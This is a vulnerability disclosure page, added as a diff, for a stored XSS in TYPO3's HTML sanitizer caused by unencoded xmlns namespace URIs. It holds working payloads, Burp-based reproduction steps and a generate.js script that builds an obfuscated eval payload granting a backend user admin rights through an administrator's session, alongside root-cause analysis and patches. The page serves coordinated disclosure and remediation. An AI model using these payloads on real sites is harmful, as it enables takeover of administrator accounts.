@@ -1,0 +1,338 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-MHJX7J31 · typo3</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-MHJX7J31 · typo3</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  xss
+  <span class="sev-badge sev-medium">medium</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-47345">CVE-2026-47345</a>
+  <a class="id-badge" href="https://github.com/advisories/GHSA-p5j5-4j3q-8mq8">GHSA-p5j5-4j3q-8mq8</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-high">high</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-medium">medium</span></span>
+</p>
+
+<p class="attribution">Discovered by
+<span class="model-chip">Claude Mythos Preview</span></p>
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-MHJX7J31: Stored XSS in TYPO3 HTML Sanitizer via <code>xmlns</code> Namespace URI Injection</h1>
+<p><code>TYPO3\HtmlSanitizer\Sanitizer::sanitize()</code> is the last line of defence that TYPO3 places between editor-supplied RTE content and the browser. It is <strong>enabled by default</strong> on every frontend page render (<code>ContentObjectRenderer::parseFunc()</code> → <code>stdWrap_htmlSanitize()</code>).</p>
+<p>An attacker who can write to any RTE bodytext field (i.e. any backend editor — the <strong>lowest-privilege backend role</strong>) can inject:</p>
+<pre tabindex="0"><code class="language-html">&lt;p xmlns:x=&quot;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(document.domain)&amp;gt;&quot;&gt;text&lt;/p&gt;
+</code></pre>
+<p>The sanitizer emits:</p>
+<pre tabindex="0"><code class="language-html">&lt;p xmlns:x=&quot;&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;&quot;&gt;text&lt;/p&gt;
+</code></pre>
+<p>The <code>&lt;img&gt;</code> tag has broken out of the attribute and its <code>onerror</code> handler <strong>fires automatically</strong> in every visitor's browser (<code>src=x</code> always errors). This is a <strong>complete, zero-click stored XSS</strong>.</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> typo3<br>
+<strong>Commit:</strong> <code>93ed2f0ef8f842a6</code><br>
+<strong>Location:</strong> <code>/var/www/html/vendor/masterminds/html5/src/HTML5/Serializer/OutputRules.php:314</code><br>
+<strong>Discovery:</strong> static analysis — not yet dynamically reproduced  </p>
+<h2>Technical Details</h2>
+<p>OutputRules.php:314 serializes namespace declarations with <code>-&gt;wr($nsNode-&gt;nodeValue)</code> instead of <code>-&gt;wr($this-&gt;enc($nsNode-&gt;nodeValue, true))</code>, under the false assumption that namespace URIs are always safe constants. TYPO3\HtmlSanitizer\Serializer\Rules extends OutputRules but does not override namespaceAttrs(), and CommonVisitor::processAttributes() iterates $domNode-&gt;attributes, which never contains xmlns:<em> nodes (they live on the XPath namespace::</em> axis). The combination yields a decode-then-emit-raw path for attacker-controlled namespace URIs.</p>
+<h2>Reproduction</h2>
+<p>This finding was identified by static analysis and has not yet been dynamically reproduced. The Technical Details section above describes the code path; a trigger input is not included.</p>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-MHJX7J31.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-MHJX7J31<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+<div class="marker">SECURITY RESEARCH FIRM ANALYSIS</div>
+<p class="section-intro">Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.</p>
+<dl class="vendor-analysis">
+<dt>Verdict</dt><dd><span class="verdict-chip verdict-tp">true positive</span></dd><dt>Severity</dt><dd class="sev-high">high</dd></dl>
+<div class="report-body" tabindex="0"><h1>Stored XSS in TYPO3 HTML Sanitizer via <code>xmlns</code> Namespace URI Injection</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Severity</strong></td>
+<td>HIGH</td>
+</tr>
+<tr>
+<td><strong>CVSS 3.1</strong></td>
+<td>8.2 — <code>AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N</code></td>
+</tr>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-79 — Stored Cross-Site Scripting</td>
+</tr>
+<tr>
+<td><strong>Affected project</strong></td>
+<td>TYPO3 Core (<code>typo3/html-sanitizer</code>, <code>masterminds/html5</code>)</td>
+</tr>
+<tr>
+<td><strong>Tested versions</strong></td>
+<td><code>typo3/cms-core</code> v13.4.28 (dynamically confirmed)</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2>Executive Summary</h2>
+<p>A backend editor — the lowest-privilege backend role — can inject a payload into any Rich Text Editor (RTE) content element that bypasses TYPO3's HTML sanitizer and executes arbitrary JavaScript in every frontend visitor's browser, including administrators, on page load without user interaction.</p>
+<p><code>TYPO3\HtmlSanitizer\Sanitizer</code> is enabled by default on every frontend page render via <code>ContentObjectRenderer::parseFunc()</code> → <code>stdWrap_htmlSanitize()</code>. By placing a crafted <code>xmlns</code> namespace attribute on an allowed HTML element, an attacker can cause the sanitizer to emit an unencoded <code>&lt;img onerror&gt;</code> tag into the HTTP response. Because <code>src=x</code> always fails, the <code>onerror</code> handler fires automatically on every page load for every visitor until the content is removed.</p>
+<hr>
+<h2>Prerequisites</h2>
+<ul>
+<li>TYPO3 v13.4.28 with default configuration (<code>security.backend.htmlSanitizeRte = false</code>, <code>htmlSanitize = true</code>)</li>
+<li>A backend editor account with write access to at least one <code>tt_content</code> record</li>
+<li>An HTTP proxy (e.g. Burp Suite) to bypass CKEditor's client-side attribute filtering</li>
+</ul>
+<hr>
+<h2>Root Cause Analysis</h2>
+<h3>Vulnerable line — <code>OutputRules.php:314</code></h3>
+<p><code>vendor/masterminds/html5/src/HTML5/Serializer/OutputRules.php</code> serializes namespace declarations without encoding:</p>
+<pre tabindex="0"><code class="language-php">protected function namespaceAttrs($ele)
+{
+    if (!$this-&gt;xpath || $this-&gt;xpath-&gt;document !== $ele-&gt;ownerDocument) {
+        $this-&gt;xpath = new \DOMXPath($ele-&gt;ownerDocument);
+    }
+
+    foreach ($this-&gt;xpath-&gt;query('namespace::*[not(.=../../namespace::*)]', $ele) as $nsNode) {
+        if (!in_array($nsNode-&gt;nodeValue, $this-&gt;implicitNamespaces)) {
+            $this-&gt;wr(' ')-&gt;wr($nsNode-&gt;nodeName)-&gt;wr('=&quot;')-&gt;wr($nsNode-&gt;nodeValue)-&gt;wr('&quot;');
+            //                                                  ^^^^^^^^^^^^^^^^^^^
+            //                                                  raw write — no encoding
+        }
+    }
+}
+</code></pre>
+<p>Regular attribute values in the same file (line ~360) are correctly encoded via <code>$this-&gt;enc($val, true)</code>. Namespace URIs are not.</p>
+<h3>Why the sanitizer cannot intercept the payload</h3>
+<p>PHP's libxml DOM stores <code>xmlns:*</code> declarations as namespace nodes, not attribute nodes. <code>CommonVisitor::processAttributes()</code> iterates <code>$domNode-&gt;attributes</code>, which returns zero entries for elements carrying namespace declarations:</p>
+<pre tabindex="0"><code>$element-&gt;attributes-&gt;length = 0        ← xmlns:x is invisible here
+XPath namespace::* → xmlns:x = '&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;'
+</code></pre>
+<p>The visitor has no mechanism to inspect or strip the payload; it passes through to the serializer untouched.</p>
+<h3>Why TYPO3 inherits the bug</h3>
+<p><code>TYPO3\HtmlSanitizer\Serializer\Rules</code> extends <code>OutputRules</code> but does not override <code>namespaceAttrs()</code>. The vulnerable parent runs unchanged on every element with a namespace declaration. <code>Sanitizer::sanitize()</code> calls <code>Traverser</code> → <code>element()</code> → <code>openTag()</code> → <code>namespaceAttrs()</code> on each element, and there is no configuration flag that disables this call.</p>
+<h3>How the payload escapes the attribute</h3>
+<p>The HTML5 parser decodes entities in attribute values per spec (<code>&amp;quot;</code> → <code>"</code>, <code>&amp;gt;</code> → <code>&gt;</code>, <code>&amp;lt;</code> → <code>&lt;</code>). The decoded value <code>"&gt;&lt;img src=x onerror=alert(document.domain)&gt;</code> is stored in a namespace node. The serializer writes it raw, terminating the <code>xmlns:x</code> attribute with the injected <code>"</code> and emitting the remaining characters as markup. The browser sees a valid <code>&lt;img&gt;</code> element.</p>
+<p>Input stored in the database:</p>
+<pre tabindex="0"><code class="language-html">&lt;div xmlns:x=&quot;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(document.domain)&amp;gt;&quot;&gt;text&lt;/div&gt;
+</code></pre>
+<p>Sanitizer output:</p>
+<pre tabindex="0"><code class="language-html">&lt;div xmlns:x=&quot;&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;&quot;&gt;text&lt;/div&gt;
+</code></pre>
+<hr>
+<h2>Reproduction Steps</h2>
+<p><strong>Note on carrier element:</strong> The <code>&lt;p&gt;</code> element is not suitable — <code>RteHtmlParser</code> applies a hard-coded attribute allowlist to <code>&lt;p&gt;</code> tags at save time that incidentally strips <code>xmlns:*</code>. The following elements survive the full editor → database → frontend chain under default configuration: <code>&lt;div&gt;</code>, <code>&lt;strong&gt;</code>, <code>&lt;table&gt;</code>, <code>&lt;blockquote&gt;</code>, <code>&lt;ul&gt;</code>, <code>&lt;ol&gt;</code>, <code>&lt;pre&gt;</code>. The <code>&lt;strong&gt;</code> variant is recommended as it appears as ordinary bold text in CKEditor.</p>
+<p><strong>Payload:</strong></p>
+<pre tabindex="0"><code class="language-html">&lt;strong xmlns:x=&quot;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(document.domain)&amp;gt;&quot;&gt;bold text&lt;/strong&gt;
+</code></pre>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Log in to the TYPO3 backend as an editor.</li>
+<li>Open a page containing a Text content element. Switch CKEditor to <strong>Source</strong> mode and enter any content.</li>
+<li>Click <strong>Save</strong> and intercept the POST request in Burp Suite.</li>
+<li>In the intercepted request, replace the value of <code>data[tt_content][&lt;uid&gt;][bodytext]</code> with the payload above and forward the request.</li>
+<li>Confirm the payload was stored:
+   <code>sql
+   SELECT bodytext FROM tt_content WHERE uid = &lt;uid&gt;;</code>
+   The output must include the <code>xmlns:x</code> attribute. If it does not, verify the correct content UID and that the request was forwarded after modification.</li>
+<li>Visit the frontend page containing the content element. <code>alert(document.domain)</code> fires on page load.</li>
+</ol>
+<p>More complicated payload could be generated using <code>generate.js</code>, for instance, this PoC was used to demonstrate the privilege escalation (minor adjustments are needed). Note that due to sudo mode (in this case, with the default validity of 5 minutes), the issue is only demonstrative — the injected script could perform any action as an administrator, or wait until the admin passes the sudo validity window.</p>
+<pre tabindex="0"><code>$ cat generate.js
+const js = `(async()=&gt;{const r=await fetch('/typo3/record/edit?edit[be_users][5]=edit',{credentials:'include'});const h=await r.text();const a=h.match(/endpoint=&quot;([^&quot;]+)/)?.[1]?.replace(/&amp;amp;/g,'&amp;');if(!a)return;const f=new FormData();f.append('data[be_users][5][admin]','1');f.append('doSave','1');f.append('closeDoc','0');f.append('popViewId','0');f.append('effectivePid','0');f.append('target','0');f.append('returnUrl','/typo3/');await fetch(a,{method:'POST',credentials:'include',body:f});})();`;
+
+const b = Buffer.from(js).toString('base64');
+console.log(`&lt;div xmlns:x=&quot;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=eval(atob('${b}'))&amp;gt;&quot;&gt;text&lt;/div&gt;`);
+
+$ node generate.js
+
+&lt;div xmlns:x=&quot;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=eval(atob('KGFzeW5jKCk9Pntjb25zdCByPWF3YWl0IGZldGNoKCcvdHlwbzMvcmVjb3JkL2VkaXQ/ZWRpdFtiZV91c2Vyc11bNV09ZWRpdCcse2NyZWRlbnRpYWxzOidpbmNsdWRlJ30pO2NvbnN0IGg9YXdhaXQgci50ZXh0KCk7Y29uc3QgYT1oLm1hdGNoKC9lbmRwb2ludD0iKFteIl0rKS8pPy5bMV0/LnJlcGxhY2UoLyZhbXA7L2csJyYnKTtpZighYSlyZXR1cm47Y29uc3QgZj1uZXcgRm9ybURhdGEoKTtmLmFwcGVuZCgnZGF0YVtiZV91c2Vyc11bNV1bYWRtaW5dJywnMScpO2YuYXBwZW5kKCdkb1NhdmUnLCcxJyk7Zi5hcHBlbmQoJ2Nsb3NlRG9jJywnMCcpO2YuYXBwZW5kKCdwb3BWaWV3SWQnLCcwJyk7Zi5hcHBlbmQoJ2VmZmVjdGl2ZVBpZCcsJzAnKTtmLmFwcGVuZCgndGFyZ2V0JywnMCcpO2YuYXBwZW5kKCdyZXR1cm5VcmwnLCcvdHlwbzMvJyk7YXdhaXQgZmV0Y2goYSx7bWV0aG9kOidQT1NUJyxjcmVkZW50aWFsczonaW5jbHVkZScsYm9keTpmfSk7fSkoKTs='))&amp;gt;&quot;&gt;text&lt;/div&gt;
+</code></pre>
+<hr>
+<h2>Fix</h2>
+<h3>Recommended — suppress namespace declarations in <code>typo3/html-sanitizer</code></h3>
+<p>Override <code>namespaceAttrs()</code> in <code>TYPO3\HtmlSanitizer\Serializer\Rules</code>. XML namespace declarations have no legitimate use in sanitised HTML5 body content:</p>
+<pre tabindex="0"><code class="language-php">// vendor/typo3/html-sanitizer/src/Serializer/Rules.php
+protected function namespaceAttrs($ele): void
+{
+    // Suppress all xmlns:* declarations — they serve no purpose in
+    // sanitised HTML5 and the parent implementation writes namespace
+    // URIs to the output stream without encoding.
+}
+</code></pre>
+<h3>Alternative — encode namespace URI values</h3>
+<p>If namespace declarations must be preserved for other use cases, apply the same encoding already used for regular attributes by calling <code>$this-&gt;enc</code>:</p>
+<pre tabindex="0"><code class="language-php">protected function namespaceAttrs($ele): void
+{
+    if (!$this-&gt;xpath || $this-&gt;xpath-&gt;document !== $ele-&gt;ownerDocument) {
+        $this-&gt;xpath = new \DOMXPath($ele-&gt;ownerDocument);
+    }
+    foreach ($this-&gt;xpath-&gt;query('namespace::*[not(.=../../namespace::*)]', $ele) as $nsNode) {
+        if (!in_array($nsNode-&gt;nodeValue, $this-&gt;implicitNamespaces)) {
+            $this-&gt;wr(' ')-&gt;wr($nsNode-&gt;nodeName)-&gt;wr('=&quot;')
+                -&gt;wr($this-&gt;enc($nsNode-&gt;nodeValue, true))
+                -&gt;wr('&quot;');
+        }
+    }
+}
+</code></pre>
+<h2>Attribution</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by <strong>Norbert Szetei</strong> at <strong>Doyensec</strong> in collaboration with Anthropic Research.</p>
+<p>For CVE credits and public acknowledgments: <strong>Doyensec in collaboration with Claude and Anthropic Research</strong></p>
+<h2>Attachment: <code>ANT-2026-05043/patch.diff</code></h2>
+<pre tabindex="0"><code>diff --git a/typo3/html-sanitizer/src/Serializer/Rules.php b/typo3/html-sanitizer/src/Serializer/Rules.php
+index 9996a94c..a689ef8a 100644
+--- a/typo3/html-sanitizer/src/Serializer/Rules.php
++++ b/typo3/html-sanitizer/src/Serializer/Rules.php
+@@ -164,6 +164,14 @@ class Rules extends OutputRules implements RulesInterface
+         $this-&gt;wr($domNode-&gt;data);
+     }
+
++    protected function namespaceAttrs($ele): void
++    {
++        // Suppress all xmlns:* declarations. They have no legitimate use in
++        // sanitised HTML5 body content, and the parent implementation writes
++        // namespace URIs to the output stream without encoding, allowing
++        // attribute breakout via crafted namespace URI values.
++    }
++
+     protected function enc($text, $attribute = false): string
+     {
+         if ($attribute &amp;&amp; $this-&gt;encodeAttributes &amp;&amp; !$this-&gt;encode) {
+</code></pre>
+<h2>Attachment: <code>ANT-2026-05043/patch2.diff</code></h2>
+<pre tabindex="0"><code>diff --git a/masterminds/html5/src/HTML5/Serializer/OutputRules.php b/masterminds/html5/src/HTML5/Serializer/OutputRules.php
+index 13cbdc66..bca27ba7 100644
+--- a/masterminds/html5/src/HTML5/Serializer/OutputRules.php
++++ b/masterminds/html5/src/HTML5/Serializer/OutputRules.php
+@@ -311,7 +311,7 @@ class OutputRules implements RulesInterface
+
+         foreach ($this-&gt;xpath-&gt;query('namespace::*[not(.=../../namespace::*)]', $ele) as $nsNode) {
+             if (!in_array($nsNode-&gt;nodeValue, $this-&gt;implicitNamespaces)) {
+-                $this-&gt;wr(' ')-&gt;wr($nsNode-&gt;nodeName)-&gt;wr('=&quot;')-&gt;wr($nsNode-&gt;nodeValue)-&gt;wr('&quot;');
++                $this-&gt;wr(' ')-&gt;wr($nsNode-&gt;nodeName)-&gt;wr('=&quot;')-&gt;wr($this-&gt;enc($nsNode-&gt;nodeValue, true))-&gt;wr('&quot;');
+             }
+         }
+     }
+</code></pre></div>
+
+
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-03-30</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-06-10</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-08-17</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">189c82e012e75b5ab44d20ba1449802f6da28844dbac5d3b08165c48a31fe875043fe292cd13d1b1bd9054a429c2810b5e527a1e1c82752debd777935b8e0bfd</p>
+<p class="kicker">Committed 2026-05-07 07:07 UTC</p>
+<p class="kicker">Revealed 2026-08-17 17:47 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-MHJX7J31-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-MHJX7J31%22%2C%22bug_class%22%3A%22XSS%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%2293ed2f0ef8f842a6%22%2C%22created_at%22%3A%222026-03-30T23%3A21%3A29%2B00%3A00%22%2C%22description%22%3A%22%60TYPO3%5C%5CHtmlSanitizer%5C%5CSanitizer%3A%3Asanitize%28%29%60%20is%20the%20last%20line%20of%20defence%20that%20TYPO3%20places%20between%20editor-supplied%20RTE%20content%20and%20the%20browser.%20It%20is%20%2A%2Aenabled%20by%20default%2A%2A%20on%20every%20frontend%20page%20render%20%28%60ContentObjectRenderer%3A%3AparseFunc%28%29%60%20%E2%86%92%20%60stdWrap_htmlSanitize%28%29%60%29.%5Cn%5CnAn%20attacker%20who%20can%20write%20to%20any%20RTE%20bodytext%20field%20%28i.e.%20any%20backend%20editor%20%E2%80%94%20the%20%2A%2Alowest-privilege%20backend%20role%2A%2A%29%20can%20inject%3A%5Cn%5Cn%60%60%60html%5Cn%3Cp%20xmlns%3Ax%3D%5C%22%26quot%3B%26gt%3B%26lt%3Bimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%26gt%3B%5C%22%3Etext%3C/p%3E%5Cn%60%60%60%5Cn%5CnThe%20sanitizer%20emits%3A%5Cn%5Cn%60%60%60html%5Cn%3Cp%20xmlns%3Ax%3D%5C%22%5C%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E%5C%22%3Etext%3C/p%3E%5Cn%60%60%60%5Cn%5CnThe%20%60%3Cimg%3E%60%20tag%20has%20broken%20out%20of%20the%20attribute%20and%20its%20%60onerror%60%20handler%20%2A%2Afires%20automatically%2A%2A%20in%20every%20visitor%27s%20browser%20%28%60src%3Dx%60%20always%20errors%29.%20This%20is%20a%20%2A%2Acomplete%2C%20zero-click%20stored%20XSS%2A%2A.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22/var/www/html/vendor/masterminds/html5/src/HTML5/Serializer/OutputRules.php%3A314%22%2C%22poc_sha256%22%3A%220ba4476579ed00f558240c313da3bbaf9c55507ae839ca9b25a4d3efbf5f0769%22%2C%22preimage_version%22%3A1%2C%22project%22%3A%22typo3%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3A%22OutputRules.php%3A314%20serializes%20namespace%20declarations%20with%20%60-%3Ewr%28%24nsNode-%3EnodeValue%29%60%20instead%20of%20%60-%3Ewr%28%24this-%3Eenc%28%24nsNode-%3EnodeValue%2C%20true%29%29%60%2C%20under%20the%20false%20assumption%20that%20namespace%20URIs%20are%20always%20safe%20constants.%20TYPO3%5C%5CHtmlSanitizer%5C%5CSerializer%5C%5CRules%20extends%20OutputRules%20but%20does%20not%20override%20namespaceAttrs%28%29%2C%20and%20CommonVisitor%3A%3AprocessAttributes%28%29%20iterates%20%24domNode-%3Eattributes%2C%20which%20never%20contains%20xmlns%3A%2A%20nodes%20%28they%20live%20on%20the%20XPath%20namespace%3A%3A%2A%20axis%29.%20The%20combination%20yields%20a%20decode-then-emit-raw%20path%20for%20attacker-controlled%20namespace%20URIs.%22%2C%22title%22%3A%22Stored%20XSS%20in%20TYPO3%20HTML%20Sanitizer%20via%20%60xmlns%60%20Namespace%20URI%20Injection%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-MHJX7J31&#34;,
+  &#34;bug_class&#34;: &#34;XSS&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: &#34;93ed2f0ef8f842a6&#34;,
+  &#34;created_at&#34;: &#34;2026-03-30T23:21:29+00:00&#34;,
+  &#34;description&#34;: &#34;`TYPO3\\HtmlSanitizer\\Sanitizer::sanitize()` is the last line of defence that TYPO3 places between editor-supplied RTE content and the browser. It is **enabled by default** on every frontend page render (`ContentObjectRenderer::parseFunc()` → `stdWrap_htmlSanitize()`).\n\nAn attacker who can write to any RTE bodytext field (i.e. any backend editor — the **lowest-privilege backend role**) can inject:\n\n```html\n&lt;p xmlns:x=\&#34;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=alert(document.domain)&amp;gt;\&#34;&gt;text&lt;/p&gt;\n```\n\nThe sanitizer emits:\n\n```html\n&lt;p xmlns:x=\&#34;\&#34;&gt;&lt;img src=x onerror=alert(document.domain)&gt;\&#34;&gt;text&lt;/p&gt;\n```\n\nThe `&lt;img&gt;` tag has broken out of the attribute and its `onerror` handler **fires automatically** in every visitor&#39;s browser (`src=x` always errors). This is a **complete, zero-click stored XSS**.&#34;,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: &#34;/var/www/html/vendor/masterminds/html5/src/HTML5/Serializer/OutputRules.php:314&#34;,
+  &#34;poc_sha256&#34;: &#34;0ba4476579ed00f558240c313da3bbaf9c55507ae839ca9b25a4d3efbf5f0769&#34;,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;typo3&#34;,
+  &#34;reproduction&#34;: null,
+  &#34;technical_details&#34;: &#34;OutputRules.php:314 serializes namespace declarations with `-&gt;wr($nsNode-&gt;nodeValue)` instead of `-&gt;wr($this-&gt;enc($nsNode-&gt;nodeValue, true))`, under the false assumption that namespace URIs are always safe constants. TYPO3\\HtmlSanitizer\\Serializer\\Rules extends OutputRules but does not override namespaceAttrs(), and CommonVisitor::processAttributes() iterates $domNode-&gt;attributes, which never contains xmlns:* nodes (they live on the XPath namespace::* axis). The combination yields a decode-then-emit-raw path for attacker-controlled namespace URIs.&#34;,
+  &#34;title&#34;: &#34;Stored XSS in TYPO3 HTML Sanitizer via `xmlns` Namespace URI Injection&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
